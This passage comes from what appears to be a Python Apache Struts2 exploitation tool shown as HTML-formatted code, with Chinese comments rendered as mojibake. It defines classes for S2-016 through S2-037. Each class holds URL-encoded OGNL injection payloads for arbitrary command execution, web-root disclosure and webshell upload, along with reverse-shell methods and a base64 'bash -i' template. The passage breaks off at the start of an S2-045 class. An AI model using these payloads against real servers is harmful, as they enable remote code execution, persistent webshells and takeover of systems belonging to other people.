&quot;redirect:$%7B%23a%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22&#123;cmd&#125;%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    exec_payload3 = r&quot;redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;&quot;</span><br><span class="line">    upload_payload1 = r&quot;&quot;&quot;redirect:$&#123;%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()&#125;&amp;t=SHELL&quot;&quot;&quot;</span><br><span class="line">    upload_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22&#123;path&#125;%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        self.exec_dict = &#123;&quot;payload1&quot;: self.exec_cmd1, &quot;payload2&quot;: self.exec_cmd2, &quot;payload3&quot;: self.exec_cmd3&#125;</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + poc, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            self.select_exec()</span><br><span class="line">            return &#x27;S2-016&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def echo_check(self, exec_fun):</span><br><span class="line">        &quot;&quot;&quot;é€šè¿‡echoè¾“å‡ºæ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        html = exec_fun(&quot;echo &quot; + hash_str)</span><br><span class="line">        if hash_str in html:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def select_exec(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©åˆé€‚çš„æ‰§è¡Œå‘½ä»¤çš„exp&quot;&quot;&quot;</span><br><span class="line">        result = self.echo_check(self.exec_cmd1)</span><br><span class="line">        if result:</span><br><span class="line">            self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        else:</span><br><span class="line">            result = self.echo_check(self.exec_cmd2)</span><br><span class="line">            if result:</span><br><span class="line">                self.exec_payload = &quot;payload2&quot;</span><br><span class="line">            else:</span><br><span class="line">                result = self.echo_check(self.exec_cmd3)</span><br><span class="line">                if result:</span><br><span class="line">                    self.exec_payload = &quot;payload3&quot;</span><br><span class="line">                else:</span><br><span class="line">                    self.exec_payload = &quot;None&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        if self.exec_payload not in self.exec_dict:</span><br><span class="line">            # print(&quot;[+] æœ¬ç¨‹åºS2_016é¢„è®¾EXPå¯¹ &#123;url&#125; æ— æ•ˆ!&quot;.format(url=self.url))</span><br><span class="line">            return None</span><br><span class="line">        result = self.exec_dict.get(self.exec_payload)(cmd)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def exec_cmd1(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload1.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd2(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload2.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd3(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload3.replace(&#x27;CMD&#x27;, quote(cmd)).replace(&#x27;ENCODING&#x27;, self.encoding),</span><br><span class="line">                   self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell1(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload1.replace(&#x27;PATH&#x27;, quote(upload_path)).replace(&#x27;SHELL&#x27;, quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell2(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&quot; + quote(shell)</span><br><span class="line">        web_path = self.get_path()</span><br><span class="line">        upload_path = upload_path.replace(web_path, &#x27;&#x27;)</span><br><span class="line">        html = post(self.url + &#x27;?&#x27; + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        result = self.upload_shell1(upload_path, shell_path)</span><br><span class="line">        if not result:</span><br><span class="line">            result = self.upload_shell2(upload_path, shell_path)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_019:</span><br><span class="line">    &quot;&quot;&quot;S2-019æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-019:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = &quot;%23req%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;)%2C%23resp%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23resp.setCharacterEncoding(&#x27;&#123;encoding&#125;&#x27;)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(&#x27;%2F&#x27;))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()&quot;</span><br><span class="line">    exec_payload = &quot;%23f%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;debug=command&amp;expression=%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22&#123;path&#125;%22)).append(%23req.getParameter(%22shell%22)).close()&amp;shell=&#123;shell&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-019&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(</span><br><span class="line">            payload=self.web_path.format(encoding=self.encoding)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(</span><br><span class="line">            self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))),</span><br><span class="line">            self.headers,</span><br><span class="line">            self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload.format(path=quote(upload_path), shell=quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_029:</span><br><span class="line">    &quot;&quot;&quot;S2-029æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-029:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.24.1(é™¤äº†2.3.20.3); POSTè¯·æ±‚å‘é€æ•°æ®,éœ€è¦å‚æ•°; é»˜è®¤å‚æ•°:message; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%5B&#x27;allowPrivateAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;excludedPackageNamePatterns&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;excludedClasses&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;allowPackageProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowStaticMethodAccess&#x27;%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;message=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-029&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_032:</span><br><span class="line">    &quot;&quot;&quot;S2-032æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-032:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    web_path = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=&#123;encoding&#125;&quot;</span><br><span class="line">    exec_payload = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=&#123;encoding&#125;&amp;cmd=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-032&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path.format(encoding=self.encoding), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), encoding=self.encoding)</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_033:</span><br><span class="line">    &quot;&quot;&quot;S2-033æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-033:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    exec_payload = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-033&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_037:</span><br><span class="line">    &quot;&quot;&quot;S2-037æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-037:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    web_path = &quot;%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;pp=%2f&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-037&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_045:</span><br><span class="line">    &quot;&quot;&quot;S2-045æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-045:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = 